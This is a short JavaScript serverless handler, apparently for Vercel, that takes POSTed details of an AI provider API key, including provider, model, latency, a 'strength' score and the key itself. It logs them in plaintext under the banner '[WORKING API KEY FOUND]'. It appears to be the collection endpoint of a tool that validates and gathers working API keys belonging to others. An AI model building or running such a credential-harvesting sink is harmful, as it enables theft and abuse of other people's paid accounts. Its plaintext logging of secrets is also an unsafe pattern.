export default function handler(req, res) {
  if (req.method === 'POST') {
    const { provider, model, key, latency, strength } = req.body || {};
    
    // This console.log will be captured by Vercel's Runtime Logs
    console.log(`[WORKING API KEY FOUND]`);
    console.log(`Provider: ${provider}`);
    console.log(`Model: ${model}`);
    console.log(`Latency: ${latency}ms`);
    console.log(`Strength: ${strength}/100`);
    console.log(`Key: ${key}`);
    console.log(`----------------------------------------`);
    
    return res.status(200).json({ success: true, message: "Logged to Vercel" });
  }
  
  return res.status(405).json({ error: "Method not allowed" });
}
